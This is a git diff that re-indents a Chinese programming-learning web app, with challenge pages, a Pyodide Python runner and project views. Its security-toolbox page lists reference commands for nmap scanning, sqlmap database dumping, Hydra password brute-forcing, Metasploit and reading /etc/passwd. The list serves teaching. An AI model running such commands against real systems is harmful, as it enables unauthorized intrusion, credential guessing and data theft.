@@ -5017,7 +5023,7 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                                             </div>
                                         </div>
                                     `;
-                                }).join('')}
+    }).join('')}
                             </div>
                             
                             <!-- 底部分页指示器 -->
@@ -5032,45 +5038,45 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                     </div>
                 </div>
             `;
-        }
-        
-        // 翻页函数
-        function flipPage(direction) {
-            const grid = document.getElementById('challenge-grid');
-            if (grid) {
-                grid.classList.add(direction === 'next' ? 'flip-left' : 'flip-right');
-                setTimeout(() => {
-                    if (direction === 'next') {
-                        gameState.challengePage++;
-                    } else {
-                        gameState.challengePage--;
-                    }
-                    render();
-                }, 400);
-            }
-        }
-        
-        // 跳转到指定页
-        function goToPage(page) {
-            const grid = document.getElementById('challenge-grid');
-            const currentPage = gameState.challengePage;
-            if (page === currentPage) return;
-            
-            if (grid) {
-                grid.classList.add(page > currentPage ? 'flip-left' : 'flip-right');
-                setTimeout(() => {
-                    gameState.challengePage = page;
-                    render();
-                }, 400);
-            }
-        }
+}
 
-        // 挑战游玩页
-        function renderChallengePlay() {
-            const challenge = GAME_DATA.challenges[gameState.currentChallengeIndex];
-            const completed = gameState.completedChallenges.has(challenge.id);
-            
-            return `
+// 翻页函数
+function flipPage(direction) {
+    const grid = document.getElementById('challenge-grid');
+    if (grid) {
+        grid.classList.add(direction === 'next' ? 'flip-left' : 'flip-right');
+        setTimeout(() => {
+            if (direction === 'next') {
+                gameState.challengePage++;
+            } else {
+                gameState.challengePage--;
+            }
+            render();
+        }, 400);
+    }
+}
+
+// 跳转到指定页
+function goToPage(page) {
+    const grid = document.getElementById('challenge-grid');
+    const currentPage = gameState.challengePage;
+    if (page === currentPage) return;
+
+    if (grid) {
+        grid.classList.add(page > currentPage ? 'flip-left' : 'flip-right');
+        setTimeout(() => {
+            gameState.challengePage = page;
+            render();
+        }, 400);
+    }
+}
+
+// 挑战游玩页
+function renderChallengePlay() {
+    const challenge = GAME_DATA.challenges[gameState.currentChallengeIndex];
+    const completed = gameState.completedChallenges.has(challenge.id);
+
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center justify-between">
                         <div class="flex items-center gap-4">
@@ -5174,11 +5180,11 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                     </div>
                 </div>
             `;
-        }
+}
 
-        // 成就页
-        function renderAchievements() {
-            return `
+// 成就页
+function renderAchievements() {
+    return `
                 <div class="min-h-screen bg-gray-900">
                     <nav class="bg-gray-800 p-4 flex items-center gap-4">
                         <button onclick="navigateTo('home')" class="text-white hover:text-purple-400 transition">
@@ -5195,8 +5201,8 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                         
                         <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-4 max-w-4xl mx-auto">
                             ${GAME_DATA.achievements.map(achievement => {
-                                const unlocked = gameState.unlockedAchievements.has(achievement.id);
-                                return `
+        const unlocked = gameState.unlockedAchievements.has(achievement.id);
+        return `
                                     <div class="bg-gray-800 rounded-xl p-5 ${unlocked ? 'border-2 border-yellow-500' : 'opacity-50'}">
                                         <div class="flex items-center gap-4">
                                             <div class="text-4xl ${unlocked ? '' : 'grayscale'}">${achievement.icon}</div>
@@ -5207,33 +5213,33 @@ fruits.forEach(fruit => console.log(fruit));</textarea>
                                         </div>
                                     </div>
                                 `;
-                            }).join('')}
+    }).join('')}
                         </div>
                     </div>
                 </div>
             `;
-        }
+}
 
-        // 代码运行器页面
-        let pyodideReady = false;
-        let pyodide = null;
-        let packagesLoaded = false;
-        
-        async function loadPyodideAndRun() {
-            const output = document.getElementById('code-output');
-            const runBtn = document.getElementById('run-btn');
-            
-            if (!pyodideReady) {
-                output.textContent = '⏳ 正在加载Python环境，首次加载需要几秒钟...';
-                runBtn.disabled = true;
-                
-                try {
-                    pyodide = await loadPyodide();
-                    pyodideReady = true;
-                    
-                    // 设置虚拟文件系统
-                    output.textContent = '⏳ 初始化文件系统...';
-                    pyodide.runPython(`
+// 代码运行器页面
+let pyodideReady = false;
+let pyodide = null;
+let packagesLoaded = false;
+
+async function loadPyodideAndRun() {
+    const output = document.getElementById('code-output');
+    const runBtn = document.getElementById('run-btn');
+
+    if (!pyodideReady) {
+        output.textContent = '⏳ 正在加载Python环境，首次加载需要几秒钟...';
+        runBtn.disabled = true;
+
+        try {
+            pyodide = await loadPyodide();
+            pyodideReady = true;
+
+            // 设置虚拟文件系统
+            output.textContent = '⏳ 初始化文件系统...';
+            pyodide.runPython(`
 import os
 # 创建示例目录和文件
 os.makedirs('/home/user', exist_ok=True)
@@ -5252,71 +5258,71 @@ with open('data.csv', 'w') as f:
 with open('data.json', 'w') as f:
     f.write('{"name": "Python", "version": "3.11", "features": ["简洁", "强大", "易学"]}')
                     `);
-                    
-                    output.textContent = '✅ Python环境已就绪！支持文件操作和大部分标准库。';
-                    runBtn.disabled = false;
-                } catch (e) {
-                    output.textContent = '❌ 加载失败: ' + e.message;
-                    runBtn.disabled = false;
-                    return;
-                }
-            }
-            
-            runCode();
+
+            output.textContent = '✅ Python环境已就绪！支持文件操作和大部分标准库。';
+            runBtn.disabled = false;
+        } catch (e) {
+            output.textContent = '❌ 加载失败: ' + e.message;
+            runBtn.disabled = false;
+            return;
         }
-        
-        // 按需加载额外的库
-        async function loadPackage(packageName) {
-            const output = document.getElementById('code-output');
+    }
+
+    runCode();
+}
+
+// 按需加载额外的库
+async function loadPackage(packageName) {
+    const output = document.getElementById('code-output');
+    try {
+        output.textContent = `⏳ 正在安装 ${packageName}...`;
+        await pyodide.loadPackage(packageName);
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
+async function runCode() {
+    if (!pyodideReady) {
+        loadPyodideAndRun();
+        return;
+    }
+
+    const code = document.getElementById('code-editor').value;
+    const output = document.getElementById('code-output');
+
+    output.textContent = '⏳ 运行中...';
+
+    try {
+        // 检测并自动加载需要的库
+        const needsPackages = [];
+        if (code.includes('import pandas') || code.includes('from pandas')) needsPackages.push('pandas');
+        if (code.includes('import numpy') || code.includes('from numpy')) needsPackages.push('numpy');
+        if (code.includes('import matplotlib') || code.includes('from matplotlib')) needsPackages.push('matplotlib');
+        if (code.includes('import scipy') || code.includes('from scipy')) needsPackages.push('scipy');
+        if (code.includes('import sympy') || code.includes('from sympy')) needsPackages.push('sympy');
+
+        // 加载需要的库
+        for (const pkg of needsPackages) {
+            output.textContent = `⏳ 正在加载 ${pkg} 库（首次使用需要下载）...`;
             try {
-                output.textContent = `⏳ 正在安装 ${packageName}...`;
-                await pyodide.loadPackage(packageName);
-                return true;
+                await pyodide.loadPackage(pkg);
             } catch (e) {
-                return false;
+                output.textContent = `⚠️ 无法加载 ${pkg}: ${e.message}`;
             }
         }
-        
-        async function runCode() {
-            if (!pyodideReady) {
-                loadPyodideAndRun();
-                return;
-            }
-            
-            const code = document.getElementById('code-editor').value;
-            const output = document.getElementById('code-output');
-            
-            output.textContent = '⏳ 运行中...';
-            
-            try {
-                // 检测并自动加载需要的库
-                const needsPackages = [];
-                if (code.includes('import pandas') || code.includes('from pandas')) needsPackages.push('pandas');
-                if (code.includes('import numpy') || code.includes('from numpy')) needsPackages.push('numpy');
-                if (code.includes('import matplotlib') || code.includes('from matplotlib')) needsPackages.push('matplotlib');
-                if (code.includes('import scipy') || code.includes('from scipy')) needsPackages.push('scipy');
-                if (code.includes('import sympy') || code.includes('from sympy')) needsPackages.push('sympy');
-                
-                // 加载需要的库
-                for (const pkg of needsPackages) {
-                    output.textContent = `⏳ 正在加载 ${pkg} 库（首次使用需要下载）...`;
-                    try {
-                        await pyodide.loadPackage(pkg);
-                    } catch (e) {
-                        output.textContent = `⚠️ 无法加载 ${pkg}: ${e.message}`;
-                    }
-                }
-                
-                output.textContent = '⏳ 运行中...';
-                
-                // 设置自定义input函数，使用JavaScript的prompt
-                pyodide.globals.set('js_prompt', (msg) => {
-                    const result = prompt(msg || '请输入:');
-                    return result === null ? '' : result;
-                });
-                
-                // 重定向stdout并重写input
-                pyodide.runPython(`
+
+        output.textContent = '⏳ 运行中...';
+
+        // 设置自定义input函数，使用JavaScript的prompt
+        pyodide.globals.set('js_prompt', (msg) => {
+            const result = prompt(msg || '请输入:');
+            return result === null ? '' : result;
+        });
+
+        // 重定向stdout并重写input
+        pyodide.runPython(`
 import sys
 from io import StringIO
 sys.stdout = StringIO()
@@ -5330,56 +5336,56 @@ def input(prompt_msg=''):
     print(result)  # 显示用户输入的内容
     return result
                 `);
-                
-                // 运行用户代码
-                await pyodide.runPythonAsync(code);
-                
-                // 获取输出
-                const stdout = pyodide.runPython('sys.stdout.getvalue()');
-                output.textContent = stdout || '(无输出)';
-            } catch (e) {
-                let errorMsg = e.message;
-                // 友好的错误提示
-                if (errorMsg.includes('requests')) {
-                    errorMsg += '\n\n💡 提示: requests库不支持，请使用 pyodide.http 或模拟数据';
-                } else if (errorMsg.includes('tkinter')) {
-                    errorMsg += '\n\n💡 提示: tkinter不支持浏览器环境，无法创建GUI窗口';
-                }
-                output.textContent = '❌ 错误:\n' + errorMsg;
-            }
+
+        // 运行用户代码
+        await pyodide.runPythonAsync(code);
+
+        // 获取输出
+        const stdout = pyodide.runPython('sys.stdout.getvalue()');
+        output.textContent = stdout || '(无输出)';
+    } catch (e) {
+        let errorMsg = e.message;
+        // 友好的错误提示
+        if (errorMsg.includes('requests')) {
+            errorMsg += '\n\n💡 提示: requests库不支持，请使用 pyodide.http 或模拟数据';
+        } else if (errorMsg.includes('tkinter')) {
+            errorMsg += '\n\n💡 提示: tkinter不支持浏览器环境，无法创建GUI窗口';
         }
-        
-        function clearCode() {
-            document.getElementById('code-editor').value = '';
-            document.getElementById('code-output').textContent = '输出将显示在这里...';
-        }
-        
-        function fillTemplate() {
-            const challenge = GAME_DATA.challenges[gameState.currentChallengeIndex];
-            const answerInput = document.getElementById('answer-input');
-            const answer = answerInput ? answerInput.value : '';
-            // 处理模板：替换答案，处理换行符
-            let code = challenge.template.replace(/___/g, answer);
-            // 如果模板中有字面 \n，转换成真正的换行
-            if (code.includes('\\n')) {
-                code = code.split('\\n').join('\n');
-            }
-            document.getElementById('code-editor').value = code;
-        }
-        
-        function loadExample(type) {
-            const examples = {
-                hello: `# 欢迎使用Python代码运行器！
+        output.textContent = '❌ 错误:\n' + errorMsg;
+    }
+}
+
+function clearCode() {
+    document.getElementById('code-editor').value = '';
+    document.getElementById('code-output').textContent = '输出将显示在这里...';
+}
+
+function fillTemplate() {
+    const challenge = GAME_DATA.challenges[gameState.currentChallengeIndex];
+    const answerInput = document.getElementById('answer-input');
+    const answer = answerInput ? answerInput.value : '';
+    // 处理模板：替换答案，处理换行符
+    let code = challenge.template.replace(/___/g, answer);
+    // 如果模板中有字面 \n，转换成真正的换行
+    if (code.includes('\\n')) {
+        code = code.split('\\n').join('\n');
+    }
+    document.getElementById('code-editor').value = code;
+}
+
+function loadExample(type) {
+    const examples = {
+        hello: `# 欢迎使用Python代码运行器！
 print("Hello, Python!")
 print("你好，编程世界！")`,
-                
-                loop: `# 循环示例
+
+        loop: `# 循环示例
 for i in range(1, 6):
     print(f"第 {i} 次循环")
     
 print("循环结束！")`,
-                
-                list: `# 列表操作
+
+        list: `# 列表操作
 fruits = ["苹果", "香蕉", "橙子", "葡萄"]
 print("水果列表:", fruits)
 print("第一个:", fruits[0])
@@ -5389,7 +5395,7 @@ print("最后一个:", fruits[-1])
 numbers = [x**2 for x in range(1, 6)]
 print("平方数:", numbers)`,
 
-                func: `# 函数定义
+        func: `# 函数定义
 def greet(name, times=1):
     for _ in range(times):
         print(f"你好，{name}！")
@@ -5397,7 +5403,7 @@ def greet(name, times=1):
 greet("Python")
 greet("编程", 3)`,
 
-                dict: `# 字典操作
+        dict: `# 字典操作
 person = {
     "name": "小明",
     "age": 18,
@@ -5411,21 +5417,21 @@ print(f"技能: {', '.join(person['skills'])}")
 # 遍历字典
 for key, value in person.items():
     print(f"{key}: {value}")`
-            };
-            
-            document.getElementById('code-editor').value = examples[type] || '';
-        }
-        
-        function renderCodeRunner() {
-            // 动态加载Pyodide脚本
-            if (!document.getElementById('pyodide-script')) {
-                const script = document.createElement('script');
-                script.id = 'pyodide-script';
-                script.src = 'https://cdn.jsdelivr.net/pyodide/v0.24.1/full/pyodide.js';
-                document.head.appendChild(script);
-            }
-            
-            return `
+    };
+
+    document.getElementById('code-editor').value = examples[type] || '';
+}
+
+function renderCodeRunner() {
+    // 动态加载Pyodide脚本
+    if (!document.getElementById('pyodide-script')) {
+        const script = document.createElement('script');
+        script.id = 'pyodide-script';
+        script.src = 'https://cdn.jsdelivr.net/pyodide/v0.24.1/full/pyodide.js';
+        document.head.appendChild(script);
+    }
+
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center justify-between">
                         <div class="flex items-center gap-4">
@@ -5495,85 +5501,85 @@ for i in range(3):
                     </div>
                 </div>
             `;
+}
+
+// 安全工具箱页面
+function renderSecurityTools() {
+    const tools = [
+        {
+            name: 'Nmap',
+            icon: '🔧',
+            desc: '网络扫描和主机发现工具',
+            color: 'red',
+            commands: [
+                { cmd: 'nmap -sP 192.168.1.0/24', desc: '扫描局域网存活主机' },
+                { cmd: 'nmap -sV -p 1-1000 target', desc: '扫描端口和服务版本' },
+                { cmd: 'nmap -O target', desc: '探测操作系统' },
+                { cmd: 'nmap -A target', desc: '全面扫描(OS+版本+脚本)' }
+            ]
+        },
+        {
+            name: 'Burp Suite',
+            icon: '🕸️',
+            desc: 'Web应用安全测试平台',
+            color: 'orange',
+            commands: [
+                { cmd: '设置代理: 127.0.0.1:8080', desc: '浏览器代理配置' },
+                { cmd: 'Intercept → Forward/Drop', desc: '拦截和修改请求' },
+                { cmd: 'Repeater → 修改参数', desc: '重放和测试请求' },
+                { cmd: 'Intruder → Payload攻击', desc: '自动化攻击测试' }
+            ]
+        },
+        {
+            name: 'SQLMap',
+            icon: '💉',
+            desc: '自动化SQL注入工具',
+            color: 'purple',
+            commands: [
+                { cmd: 'sqlmap -u "url?id=1"', desc: '检测SQL注入' },
+                { cmd: 'sqlmap -u url --dbs', desc: '列出所有数据库' },
+                { cmd: 'sqlmap -u url -D db --tables', desc: '列出表名' },
+                { cmd: 'sqlmap -u url --dump', desc: '导出数据' }
+            ]
+        },
+        {
+            name: 'Metasploit',
+            icon: '🎯',
+            desc: '渗透测试框架',
+            color: 'blue',
+            commands: [
+                { cmd: 'msfconsole', desc: '启动控制台' },
+                { cmd: 'search exploit_name', desc: '搜索漏洞利用模块' },
+                { cmd: 'use exploit/...', desc: '选择模块' },
+                { cmd: 'set RHOSTS target', desc: '设置目标' }
+            ]
+        },
+        {
+            name: 'Hydra',
+            icon: '🔑',
+            desc: '密码爆破工具',
+            color: 'green',
+            commands: [
+                { cmd: 'hydra -l user -P pass.txt ssh://target', desc: 'SSH爆破' },
+                { cmd: 'hydra -L users.txt -P pass.txt ftp://target', desc: 'FTP爆破' },
+                { cmd: 'hydra -l admin -P pass.txt http-post://target', desc: 'HTTP表单爆破' }
+            ]
+        },
+        {
+            name: 'Linux命令',
+            icon: '🐧',
+            desc: '常用渗透命令',
+            color: 'gray',
+            commands: [
+                { cmd: 'whoami && id', desc: '查看当前用户' },
+                { cmd: 'cat /etc/passwd', desc: '查看用户列表' },
+                { cmd: 'find / -perm -4000 2>/dev/null', desc: '查找SUID文件' },
+                { cmd: 'netstat -antp', desc: '查看网络连接' }
+            ]
         }
-        
-        // 安全工具箱页面
-        function renderSecurityTools() {
-            const tools = [
-                {
-                    name: 'Nmap',
-                    icon: '🔧',
-                    desc: '网络扫描和主机发现工具',
-                    color: 'red',
-                    commands: [
-                        { cmd: 'nmap -sP 192.168.1.0/24', desc: '扫描局域网存活主机' },
-                        { cmd: 'nmap -sV -p 1-1000 target', desc: '扫描端口和服务版本' },
-                        { cmd: 'nmap -O target', desc: '探测操作系统' },
-                        { cmd: 'nmap -A target', desc: '全面扫描(OS+版本+脚本)' }
-                    ]
-                },
-                {
-                    name: 'Burp Suite',
-                    icon: '🕸️',
-                    desc: 'Web应用安全测试平台',
-                    color: 'orange',
-                    commands: [
-                        { cmd: '设置代理: 127.0.0.1:8080', desc: '浏览器代理配置' },
-                        { cmd: 'Intercept → Forward/Drop', desc: '拦截和修改请求' },
-                        { cmd: 'Repeater → 修改参数', desc: '重放和测试请求' },
-                        { cmd: 'Intruder → Payload攻击', desc: '自动化攻击测试' }
-                    ]
-                },
-                {
-                    name: 'SQLMap',
-                    icon: '💉',
-                    desc: '自动化SQL注入工具',
-                    color: 'purple',
-                    commands: [
-                        { cmd: 'sqlmap -u "url?id=1"', desc: '检测SQL注入' },
-                        { cmd: 'sqlmap -u url --dbs', desc: '列出所有数据库' },
-                        { cmd: 'sqlmap -u url -D db --tables', desc: '列出表名' },
-                        { cmd: 'sqlmap -u url --dump', desc: '导出数据' }
-                    ]
-                },
-                {
-                    name: 'Metasploit',
-                    icon: '🎯',
-                    desc: '渗透测试框架',
-                    color: 'blue',
-                    commands: [
-                        { cmd: 'msfconsole', desc: '启动控制台' },
-                        { cmd: 'search exploit_name', desc: '搜索漏洞利用模块' },
-                        { cmd: 'use exploit/...', desc: '选择模块' },
-                        { cmd: 'set RHOSTS target', desc: '设置目标' }
-                    ]
-                },
-                {
-                    name: 'Hydra',
-                    icon: '🔑',
-                    desc: '密码爆破工具',
-                    color: 'green',
-                    commands: [
-                        { cmd: 'hydra -l user -P pass.txt ssh://target', desc: 'SSH爆破' },
-                        { cmd: 'hydra -L users.txt -P pass.txt ftp://target', desc: 'FTP爆破' },
-                        { cmd: 'hydra -l admin -P pass.txt http-post://target', desc: 'HTTP表单爆破' }
-                    ]
-                },
-                {
-                    name: 'Linux命令',
-                    icon: '🐧',
-                    desc: '常用渗透命令',
-                    color: 'gray',
-                    commands: [
-                        { cmd: 'whoami && id', desc: '查看当前用户' },
-                        { cmd: 'cat /etc/passwd', desc: '查看用户列表' },
-                        { cmd: 'find / -perm -4000 2>/dev/null', desc: '查找SUID文件' },
-                        { cmd: 'netstat -antp', desc: '查看网络连接' }
-                    ]
-                }
-            ];
-            
-            return `
+    ];
+
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center justify-between">
                         <div class="flex items-center gap-4">
@@ -5646,17 +5652,17 @@ for i in range(3):
                     </div>
                 </div>
             `;
-        }
-        
-        // 项目列表页
-        function renderProjects() {
-            const course = gameState.selectedCourse || 'python';
-            const courseInfo = COURSE_CONFIG[course] || COURSE_CONFIG.python;
-            const filteredProjects = GAME_DATA.projects.filter(p => 
-                p.courseType === course || (!p.courseType && course === 'python')
-            );
-            
-            return `
+}
+
+// 项目列表页
+function renderProjects() {
+    const course = gameState.selectedCourse || 'python';
+    const courseInfo = COURSE_CONFIG[course] || COURSE_CONFIG.python;
+    const filteredProjects = GAME_DATA.projects.filter(p =>
+        p.courseType === course || (!p.courseType && course === 'python')
+    );
+
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center justify-between">
                         <div class="flex items-center gap-4">
@@ -5675,8 +5681,8 @@ for i in range(3):
                         
                         <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
                             ${filteredProjects.map((project) => {
-                                const realIndex = GAME_DATA.projects.indexOf(project);
-                                return `
+        const realIndex = GAME_DATA.projects.indexOf(project);
+        return `
                                 <div class="glass-card tilt-card rounded-xl p-6 cursor-pointer relative overflow-hidden"
                                      onclick="startProject(${realIndex})">
                                     <div class="tilt-glow"></div>
@@ -5700,32 +5706,32 @@ for i in range(3):
                                     </div>
                                 </div>
                                 `;
-                            }).join('')}
+    }).join('')}
                         </div>
                     </div>
                 </div>
             `;
-        }
-        
-        // 开始项目
-        function startProject(index) {
-            gameState.currentProjectIndex = index;
-            navigateTo('projectDetail');
-        }
-        
-        // 项目详情页
-        function renderProjectDetail() {
-            const project = GAME_DATA.projects[gameState.currentProjectIndex];
-            
-            // 动态加载Pyodide脚本
-            if (!document.getElementById('pyodide-script')) {
-                const script = document.createElement('script');
-                script.id = 'pyodide-script';
-                script.src = 'https://cdn.jsdelivr.net/pyodide/v0.24.1/full/pyodide.js';
-                document.head.appendChild(script);
-            }
-            
-            return `
+}
+
+// 开始项目
+function startProject(index) {
+    gameState.currentProjectIndex = index;
+    navigateTo('projectDetail');
+}
+
+// 项目详情页
+function renderProjectDetail() {
+    const project = GAME_DATA.projects[gameState.currentProjectIndex];
+
+    // 动态加载Pyodide脚本
+    if (!document.getElementById('pyodide-script')) {
+        const script = document.createElement('script');
+        script.id = 'pyodide-script';
+        script.src = 'https://cdn.jsdelivr.net/pyodide/v0.24.1/full/pyodide.js';
+        document.head.appendChild(script);
+    }
+
+    return `
                 <div class="min-h-screen">
                     <nav class="glass-dark p-4 flex items-center justify-between">
                         <div class="flex items-center gap-4">
@@ -5751,16 +5757,16 @@ for i in range(3):
                                     </h2>
                                     <div class="text-gray-300 text-sm prose prose-invert max-w-none">
                                         ${project.instructions.split('\n').map(line => {
-                                            if (line.startsWith('## ')) {
-                                                return `<h3 class="text-purple-400 font-bold mt-4 mb-2">${line.slice(3)}</h3>`;
-                                            } else if (line.startsWith('- ')) {
-                                                return `<div class="ml-4">• ${line.slice(2)}</div>`;
-                                            } else if (line.match(/^\d+\./)) {
-                                                return `<div class="ml-4">${line}</div>`;
-                                            } else {
-                                                return `<p class="mb-2">${line}</p>`;
-                                            }
-                                        }).join('')}
+        if (line.startsWith('## ')) {
+            return `<h3 class="text-purple-400 font-bold mt-4 mb-2">${line.slice(3)}</h3>`;
+        } else if (line.startsWith('- ')) {
+            return `<div class="ml-4">• ${line.slice(2)}</div>`;
+        } else if (line.match(/^\d+\./)) {
+            return `<div class="ml-4">${line}</div>`;
+        } else {
+            return `<p class="mb-2">${line}</p>`;
+        }
+    }).join('')}
                                     </div>
                                 </div>
                                 
@@ -5833,181 +5839,181 @@ for i in range(3):
                     </div>
                 </div>
             `;
-        }
-        
-        // 加载项目模板
-        function loadProjectTemplate() {
-            const project = GAME_DATA.projects[gameState.currentProjectIndex];
-            document.getElementById('code-editor').value = project.template;
-        }
-        
-        // 显示项目答案
-        function showProjectSolution() {
-            const project = GAME_DATA.projects[gameState.currentProjectIndex];
-            if (confirm('确定要查看答案吗？建议先自己尝试！')) {
-                document.getElementById('code-editor').value = project.solution;
-            }
-        }
-        
-        // 上一个项目
-        function prevProject() {
-            if (gameState.currentProjectIndex > 0) {
-                gameState.currentProjectIndex--;
-                render();
-            }
-        }
-        
-        // 下一个项目
-        function nextProject() {
-            if (gameState.currentProjectIndex < GAME_DATA.projects.length - 1) {
-                gameState.currentProjectIndex++;
-                render();
-            }
-        }
+}
 
-        // ============== 辅助函数 ==============
-        function highlightCode(code) {
-            return code
-                .replace(/</g, '&lt;')
-                .replace(/>/g, '&gt;')
-                .replace(/___/g, '<span class="bg-yellow-500/40 px-2 py-0.5 rounded text-yellow-300 font-bold">___</span>');
-        }
-        
-        // 格式化学习时长
-        function formatStudyTime(seconds) {
-            if (seconds < 60) return `${seconds}秒`;
-            if (seconds < 3600) return `${Math.floor(seconds/60)}分钟`;
-            const hours = Math.floor(seconds / 3600);
-            const mins = Math.floor((seconds % 3600) / 60);
-            return `${hours}小时${mins}分`;
-        }
-        
-        // ============== 3D Tilt Effect ==============
-        function initTiltEffect() {
-            const cards = document.querySelectorAll('.tilt-card');
-            
-            cards.forEach(card => {
-                // 防止重复绑定
-                if (card.dataset.tiltInit) return;
-                card.dataset.tiltInit = 'true';
-                
-                // 鼠标移动 - 3D倾斜效果
-                card.addEventListener('mousemove', (e) => {
-                    const rect = card.getBoundingClientRect();
-                    const x = e.clientX - rect.left;
-                    const y = e.clientY - rect.top;
-                    const centerX = rect.width / 2;
-                    const centerY = rect.height / 2;
-                    
-                    const rotateX = (y - centerY) / centerY * -8;
-                    const rotateY = (x - centerX) / centerX * 8;
-                    
-                    card.style.transform = 'perspective(800px) rotateX(' + rotateX + 'deg) rotateY(' + rotateY + 'deg) translateZ(15px)';
-                });
-                
-                // 鼠标离开 - 重置3D效果
-                card.addEventListener('mouseleave', () => {
-                    card.style.transform = '';
-                });
-            });
-        }
-        
-        // 视频背景控制
-        let currentVideoIndex = 0;
-        let wallpaperMenuOpen = false;
-        const VIDEO_LIST = [
-            { id: 'bg-video-0', name: '五条悟', overlay: 'linear-gradient(135deg, rgba(102, 126, 234, 0.5) 0%, rgba(118, 75, 162, 0.5) 100%)' },
-            { id: 'bg-video-1', name: '双马尾', overlay: 'linear-gradient(135deg, rgba(17, 24, 39, 0.4) 0%, rgba(31, 41, 55, 0.3) 100%)' },
-            { id: 'bg-video-2', name: '动漫少女', overlay: 'linear-gradient(135deg, rgba(236, 72, 153, 0.4) 0%, rgba(139, 92, 246, 0.4) 100%)' },
-            { id: 'bg-video-3', name: '光影美女', overlay: 'linear-gradient(135deg, rgba(251, 146, 60, 0.4) 0%, rgba(234, 88, 12, 0.4) 100%)' },
-            { id: 'bg-video-4', name: '古风美女', overlay: 'linear-gradient(135deg, rgba(220, 38, 38, 0.4) 0%, rgba(153, 27, 27, 0.4) 100%)' },
-            { id: 'none', name: '关闭', overlay: 'none' }
-        ];
-        
-        // 切换壁纸菜单
-        function toggleWallpaperMenu() {
-            wallpaperMenuOpen = !wallpaperMenuOpen;
-            const options = document.getElementById('wallpaper-options');
-            const btn = document.getElementById('wallpaper-btn');
-            
-            if (wallpaperMenuOpen) {
-                options.classList.remove('spinning');
-                options.classList.add('open');
-                btn.classList.add('open');
-                updateActiveButton();
-                // 展开动画结束后开始持续旋转
-                setTimeout(() => {
-                    if (wallpaperMenuOpen) {
-                        options.classList.add('spinning');
-                    }
-                }, 800);
-            } else {
-                options.classList.remove('open');
-                options.classList.remove('spinning');
-                btn.classList.remove('open');
-            }
-        }
-        
-        // 选择壁纸
-        function selectWallpaper(index) {
-            currentVideoIndex = index;
-            updateVideoBg();
-            updateActiveButton();
-            // 延迟关闭菜单
-            setTimeout(() => {
-                toggleWallpaperMenu();
-            }, 300);
-        }
-        
-        // 更新选中按钮状态
-        function updateActiveButton() {
-            document.querySelectorAll('.wallpaper-option button').forEach((btn, i) => {
-                btn.classList.toggle('active', i === currentVideoIndex);
-            });
-        }
-        
-        // 更新视频背景显示
-        function updateVideoBg() {
-            const overlay = document.getElementById('video-overlay');
-            const current = VIDEO_LIST[currentVideoIndex];
-            
-            // 隐藏所有视频
-            for (let i = 0; i < VIDEO_LIST.length - 1; i++) {
-                const video = document.getElementById(`bg-video-${i}`);
-                if (video) {
-                    video.style.display = 'none';
-                    video.pause();
-                }
-            }
-            
-            if (current.id === 'none') {
-                // 关闭背景
-                overlay.style.display = 'none';
-            } else {
-                // 显示选中的视频
-                const video = document.getElementById(current.id);
-                if (video) {
-                    video.style.display = 'block';
-                    video.play();
-                }
-                overlay.style.display = 'block';
-                overlay.style.background = current.overlay;
-            }
-        }
-        
-        // 点击其他地方关闭菜单
-        document.addEventListener('click', (e) => {
-            const menu = document.getElementById('wallpaper-menu');
-            if (wallpaperMenuOpen && menu && !menu.contains(e.target)) {
-                toggleWallpaperMenu();
-            }
+// 加载项目模板
+function loadProjectTemplate() {
+    const project = GAME_DATA.projects[gameState.currentProjectIndex];
+    document.getElementById('code-editor').value = project.template;
+}
+
+// 显示项目答案
+function showProjectSolution() {
+    const project = GAME_DATA.projects[gameState.currentProjectIndex];
+    if (confirm('确定要查看答案吗？建议先自己尝试！')) {
+        document.getElementById('code-editor').value = project.solution;
+    }
+}
+
+// 上一个项目
+function prevProject() {
+    if (gameState.currentProjectIndex > 0) {
+        gameState.currentProjectIndex--;
+        render();
+    }
+}
+
+// 下一个项目
+function nextProject() {
+    if (gameState.currentProjectIndex < GAME_DATA.projects.length - 1) {
+        gameState.currentProjectIndex++;
+        render();
+    }
+}
+
+// ============== 辅助函数 ==============
+function highlightCode(code) {
+    return code
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/___/g, '<span class="bg-yellow-500/40 px-2 py-0.5 rounded text-yellow-300 font-bold">___</span>');
+}
+
+// 格式化学习时长
+function formatStudyTime(seconds) {
+    if (seconds < 60) return `${seconds}秒`;
+    if (seconds < 3600) return `${Math.floor(seconds / 60)}分钟`;
+    const hours = Math.floor(seconds / 3600);
+    const mins = Math.floor((seconds % 3600) / 60);
+    return `${hours}小时${mins}分`;
+}
+
+// ============== 3D Tilt Effect ==============
+function initTiltEffect() {
+    const cards = document.querySelectorAll('.tilt-card');
+
+    cards.forEach(card => {
+        // 防止重复绑定
+        if (card.dataset.tiltInit) return;
+        card.dataset.tiltInit = 'true';
+
+        // 鼠标移动 - 3D倾斜效果
+        card.addEventListener('mousemove', (e) => {
+            const rect = card.getBoundingClientRect();
+            const x = e.clientX - rect.left;
+            const y = e.clientY - rect.top;
+            const centerX = rect.width / 2;
+            const centerY = rect.height / 2;
+
+            const rotateX = (y - centerY) / centerY * -8;
+            const rotateY = (x - centerX) / centerX * 8;
+
+            card.style.transform = 'perspective(800px) rotateX(' + rotateX + 'deg) rotateY(' + rotateY + 'deg) translateZ(15px)';
         });
-        
-        // 错题本页面
-        function renderWrongBook() {
-            const wrongChallenges = GAME_DATA.challenges.filter(c => gameState.wrongAnswers.has(c.id));
-            
-            return `
+
+        // 鼠标离开 - 重置3D效果
+        card.addEventListener('mouseleave', () => {
+            card.style.transform = '';
+        });
+    });
+}
+
+// 视频背景控制
+let currentVideoIndex = 0;
+let wallpaperMenuOpen = false;
+const VIDEO_LIST = [
+    { id: 'bg-video-0', name: '五条悟', overlay: 'linear-gradient(135deg, rgba(102, 126, 234, 0.5) 0%, rgba(118, 75, 162, 0.5) 100%)' },
